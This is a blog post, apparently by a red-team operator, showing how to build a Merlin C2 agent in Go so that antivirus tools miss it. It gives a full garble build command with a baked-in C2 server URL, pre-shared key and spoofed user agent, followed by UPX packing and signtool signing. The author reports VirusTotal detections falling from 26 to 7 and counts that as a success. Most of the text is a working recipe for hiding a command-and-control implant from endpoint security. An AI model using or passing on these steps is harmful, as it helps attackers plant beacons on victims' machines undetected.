---
title: Go evasion techniques (Merlin C2)
date: 2025-12-14 23:00:00
categories: Blogging
tags: [go, obfuscation, upx, garble, merlin, signtool]
description: Compiling go in obfuscated fasions
---


## The problem
I've been playing around with the Merlin C2 framework, it's a great versatile tool that's unique in it's implementation of the HTTP3 (QUIC) protocol for beacon communication. 

The problem is that by default when you compile a go binary it leaks EVERYTHING in clear text, in the case of Merlin this includes the Merlin C2 GitHub URL and the full path the binary was compiled in (this leaks your username)!

Bad OPSEC.....
## Garble
We can obfuscate the code with the garble go package.
First make sure you have go version 1.25+ you can download the stable release from here https://go.dev/dl/.

Then download Garble in the merlin-agent directory and build:

```shell
go install mvdan.cc/garble@latest

GOOS=windows GOARCH=amd64 garble -literals -tiny build -tags=purego  -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444" -X "main.transforms=jwe,gob-base" -X "main.listener=" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=c4571f4dda227ef7255892f962f19916afc32995" -X "main.protocol=h2" -X "main.url=https://192.168.1.1:443" -X "main.host=" -X "main.httpClient=go" -X "main.psk=Password1" -X "main.secure=false" -X "main.sleep=30s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=7" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o merlinAgent-Windows-x64.exe ./main.go

```
{: .nolineno }
> Change the Merlin variables to your needs
{: .prompt-info }

With this approach we have removed almost all the noisy artifacts associated with the normal build process. 

## UPX
At this point if we upload the executable to VirusTotal only 17 security vendors flag us compared to 26 with the normal compile process. But can we do better?

If we run strings against the executable all our variables including PSK, server URL, user agent and protocol are visible in cleartext, we can fix this with a packer such as UPX.
```
upx --best --lzma agent.exe
```
{: .nolineno }

This removes all readable strings and shrinks our executable to about 40% however there is a major drawback - on VirusTotal we are now flagged by 24 vendors...
This is because UPX is inherently suspicious and often used by malicious actors so it raised a lot of red flags.

## Signing
We have effectively reached the goal we set out, namely to improve OPSEC by obfuscating our Merlin executable buttt getting flagged by 17 vendors seems like too many...
An easy way to reduce that number is by signing.

Download SignTool, the easiest way to download it is with Visual Studio just download the Windows 10 SDK then add `C:\Program Files (x86)\Windows Kits\10\App Certification Kit` to Path and sign the executable with:
```shell
signtool sign /fd SHA256 /a /tr http://timestamp.digicert.com /td SHA256 agent.exe
```
{: .nolineno }

And now only 7 security vendors flag the file on VirusTotal!!
## Closing thoughts
Mission accomplished!

With relatively minimal evasion techniques we managed to to dupe 65/72 security vendors and we obfuscated most of the cleartext strings.
I think it's interesting that by only adding a certificate to the malicious Merlin beacon 10 security vendors dropped detection. Perhaps this signals an over reliance and trust on certificates....

This is good enough for my current use case but perhaps I will revisit more thorough evasion techniques in a future post.
See you next time!